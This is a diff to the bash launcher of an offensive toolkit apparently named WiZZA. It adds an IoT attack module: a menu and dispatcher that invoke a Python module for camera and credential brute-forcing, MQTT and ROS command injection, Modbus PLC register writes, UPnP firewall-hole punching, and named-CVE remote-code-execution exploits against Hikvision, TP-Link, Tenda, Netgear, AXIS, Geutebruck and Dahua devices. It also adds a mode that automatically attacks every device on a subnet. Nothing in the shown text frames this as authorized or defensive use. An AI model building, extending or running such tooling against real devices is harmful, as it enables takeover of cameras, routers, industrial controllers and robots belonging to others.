@@ -3251,6 +3251,18 @@ cmd_help() {
     echo -e "  ${C}bash start zeroclick${N}     IPv6 Rogue RA + WPAD/NTLMv1 + mDNS + ADIDNS chain"
     echo -e "                          Compromises all LAN hosts with zero victim interaction"
     echo ""
+    echo -e "  ${Y}━━━ IOT ATTACKS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
+    echo -e "  ${C}bash start iot${N}           Interactive IoT attack menu (20 options)"
+    echo -e "  ${C}bash start iot auto${N}      Full auto: scan subnet, attack all IoT devices"
+    echo -e "  ${C}bash start iot scan${N}      Discover IoT devices (cameras, routers, PLCs...)"
+    echo -e "  ${C}bash start iot rtsp <ip>${N} RTSP camera brute-force + snapshot capture"
+    echo -e "  ${C}bash start iot mqtt <ip>${N} MQTT broker: dump all topics + inject commands"
+    echo -e "  ${C}bash start iot hue <ip>${N}  Philips Hue: enumerate + control all lights"
+    echo -e "  ${C}bash start iot ros <ip>${N}  ROS robot: dump topics + inject velocity"
+    echo -e "  ${C}bash start iot modbus <ip>${N} Modbus PLC: read/write registers (no auth)"
+    echo -e "  ${C}bash start iot hikvision <ip>${N} CVE-2021-36260 pre-auth RCE"
+    echo -e "  ${C}bash start iot tplink <ip>${N}   CVE-2023-1389 unauthenticated RCE"
+    echo ""
     echo -e "  ${Y}━━━ WIFI ATTACKS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
     echo -e "  ${C}bash start wifi${N}          Interactive WiFi attack menu"
     echo -e "  ${C}bash start wifi auto${N}     Auto: scan, pick, PMKID/handshake, crack"
@@ -6893,6 +6905,171 @@ cmd_netmap() {
 }
 
 # ══════════════════════════════════════════════════════════════════════════════
+# IoT Attack
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_iot() {
+    local ACTION="${1:-menu}"
+    local TARGET="${2:-}"
+    local EXTRA1="${3:-}"
+    local EXTRA2="${4:-}"
+    local MOD="$DIR/op/modules/iot_attack.py"
+
+    case "$ACTION" in
+        menu|"")
+            clear
+            echo -e "${C}"
+            echo "  +----------------------------------------------------------+"
+            echo "  |             WiZZA -- IoT Attack Module                    |"
+            echo "  +----------------------------------------------------------+"
+            echo -e "${N}"
+            echo -e "  ${Y}Coverage: Cameras, Smart Home, Robots, Industrial, MQTT, UPnP${N}"
+            echo ""
+            echo -e "  ${W}[1]${N}  Auto-attack subnet      (scan + attack all IoT devices)"
+            echo -e "  ${W}[2]${N}  Port scan subnet        (discover IoT devices)"
+            echo -e "  ${W}[3]${N}  SSDP/UPnP discovery     (multicast device discovery)"
+            echo -e "  ${W}[4]${N}  mDNS discovery          (Bonjour/Avahi device names)"
+            echo -e "  ${W}[5]${N}  RTSP camera brute       (find + stream cameras)"
+            echo -e "  ${W}[6]${N}  MQTT broker attack      (dump topics + inject commands)"
+            echo -e "  ${W}[7]${N}  Default creds brute     (Telnet/SSH/HTTP)"
+            echo -e "  ${W}[8]${N}  Philips Hue attack      (control all lights)"
+            echo -e "  ${W}[9]${N}  LIFX bulb attack        (UDP broadcast control)"
+            echo -e "  ${W}[10]${N} Modbus scan/write       (PLC/SCADA/HVAC registers)"
+            echo -e "  ${W}[11]${N} ROS robot attack        (topic dump + velocity inject)"
+            echo -e "  ${W}[12]${N} CoAP probe              (resource discovery)"
+            echo -e "  ${W}[13]${N} UPnP port map abuse     (poke firewall holes via router)"
+            echo ""
+            echo -e "  ${Y}CVE Exploits:${N}"
+            echo -e "  ${W}[14]${N} CVE-2021-36260  Hikvision pre-auth RCE"
+            echo -e "  ${W}[15]${N} CVE-2023-1389   TP-Link Archer unauthenticated RCE"
+            echo -e "  ${W}[16]${N} CVE-2020-10987  Tenda AC router RCE"
+            echo -e "  ${W}[17]${N} CVE-2021-40847  Netgear Circle parental RCE"
+            echo -e "  ${W}[18]${N} CVE-2018-10660  AXIS camera command injection"
+            echo -e "  ${W}[19]${N} CVE-2021-33544  Geutebruck camera RCE"
+            echo -e "  ${W}[20]${N} Dahua auth bypass + snapshot grab"
+            echo ""
+            read -rp "  Select [1-20]: " sel
+            case "$sel" in
+                1)  read -rp "  Subnet [192.168.1.0/24]: " SN; SN="${SN:-192.168.1.0/24}"
+                    check_root; sudo python3 "$MOD" auto --subnet "$SN" ;;
+                2)  read -rp "  Subnet [192.168.1.0/24]: " SN; SN="${SN:-192.168.1.0/24}"
+                    python3 "$MOD" scan --subnet "$SN" ;;
+                3)  python3 "$MOD" ssdp ;;
+                4)  python3 "$MOD" mdns --duration 15 ;;
+                5)  read -rp "  Camera IP: " IP; check_root
+                    sudo python3 "$MOD" rtsp --ip "$IP" ;;
+                6)  read -rp "  MQTT broker IP: " IP
+                    python3 "$MOD" mqtt --ip "$IP" ;;
+                7)  read -rp "  Target IP: " IP; check_root
+                    sudo python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from iot_attack import telnet_brute, ssh_brute, camera_default_creds
+telnet_brute('$IP'); ssh_brute('$IP'); camera_default_creds('$IP')
+" ;;
+                8)  read -rp "  Hue bridge IP: " IP
+                    python3 "$MOD" hue --ip "$IP" ;;
+                9)  python3 "$MOD" lifx ;;
+                10) read -rp "  Modbus device IP: " IP
+                    python3 "$MOD" modbus --ip "$IP" ;;
+                11) read -rp "  ROS master IP: " IP
+                    python3 "$MOD" ros --ip "$IP" ;;
+                12) read -rp "  CoAP device IP: " IP
+                    python3 "$MOD" coap --ip "$IP" ;;
+                13) read -rp "  UPnP gateway IP: " GW
+                    read -rp "  External port: " EP
+                    read -rp "  Internal IP: " INT_IP
+                    read -rp "  Internal port: " INT_PORT
+                    python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from iot_attack import upnp_port_map
+upnp_port_map('$GW', $EP, '$INT_IP', $INT_PORT)
+" ;;
+                14) read -rp "  Hikvision IP: " IP
+                    read -rp "  Command [id]: " CMD; CMD="${CMD:-id}"
+                    python3 "$MOD" hikvision_rce --ip "$IP" --cmd "$CMD" ;;
+                15) read -rp "  TP-Link IP: " IP
+                    python3 "$MOD" tplink_rce --ip "$IP" ;;
+                16) read -rp "  Tenda IP: " IP
+                    python3 "$MOD" tenda_rce --ip "$IP" ;;
+                17) read -rp "  Netgear IP: " IP
+                    python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from iot_attack import cve_netgear_rce
+cve_netgear_rce('$IP')
+" ;;
+                18) read -rp "  AXIS camera IP: " IP
+                    python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from iot_attack import cve_axis_rce
+cve_axis_rce('$IP')
+" ;;
+                19) read -rp "  Geutebruck IP: " IP
+                    python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from iot_attack import cve_geutebruck_rce
+cve_geutebruck_rce('$IP')
+" ;;
+                20) read -rp "  Dahua DVR/NVR IP: " IP
+                    python3 "$MOD" --action dahua_bypass --ip "$IP" ;;
+            esac
+            ;;
+
+        auto)
+            check_root
+            SN="${TARGET:-192.168.1.0/24}"
+            echo -e "${Y}[*] IoT auto-attack: $SN${N}"
+            sudo python3 "$MOD" auto --subnet "$SN"
+            ;;
+        scan)
+            SN="${TARGET:-192.168.1.0/24}"
+            echo -e "${Y}[*] IoT scan: $SN${N}"
+            python3 "$MOD" scan --subnet "$SN"
+            ;;
+        rtsp)
+            check_root
+            echo -e "${Y}[*] RTSP brute: $TARGET${N}"
+            sudo python3 "$MOD" rtsp --ip "$TARGET"
+            ;;
+        mqtt)
+            echo -e "${Y}[*] MQTT attack: $TARGET${N}"
+            python3 "$MOD" mqtt --ip "$TARGET"
+            ;;
+        hue)
+            echo -e "${Y}[*] Philips Hue: $TARGET${N}"
+            python3 "$MOD" hue --ip "$TARGET"
+            ;;
+        ros)
+            echo -e "${Y}[*] ROS probe: $TARGET${N}"
+            python3 "$MOD" ros --ip "$TARGET"
+            ;;
+        hikvision)
+            CMD="${EXTRA1:-id}"
+            echo -e "${Y}[*] CVE-2021-36260 Hikvision: $TARGET${N}"
+            python3 "$MOD" hikvision_rce --ip "$TARGET" --cmd "$CMD"
+            ;;
+        tplink)
+            echo -e "${Y}[*] CVE-2023-1389 TP-Link: $TARGET${N}"
+            python3 "$MOD" tplink_rce --ip "$TARGET"
+            ;;
+        modbus)
+            echo -e "${Y}[*] Modbus: $TARGET${N}"
+            python3 "$MOD" modbus --ip "$TARGET"
+            ;;
+        ssdp)
+            python3 "$MOD" ssdp
+            ;;
+        mdns)
+            python3 "$MOD" mdns --duration 15
+            ;;
+        lifx)
+            python3 "$MOD" lifx
+            ;;
+        *)
+            echo "Usage: start iot [auto|scan|rtsp|mqtt|hue|ros|hikvision|tplink|modbus|ssdp|mdns|lifx] [target]"
+            ;;
+    esac
+}
+
+# ══════════════════════════════════════════════════════════════════════════════
 # WiFi Attack
 # ══════════════════════════════════════════════════════════════════════════════
 cmd_wifi() {
@@ -7112,6 +7289,7 @@ case "$CMD" in
     netmap)         init_files; cmd_netmap ;;
     wifi)           init_files; cmd_wifi "$2" "$3" "$4" "$5" ;;
     zeroclick)      init_files; cmd_zeroclick "$2" "$3" "$4" "$5" ;;
+    iot)            init_files; cmd_iot "$2" "$3" "$4" "$5" ;;
     physical)
         # sudo re-exec entry point: start physical <victim_ip> <target_domain>
         VICTIM_IP="$2"; TARGET_DOMAIN="$3"
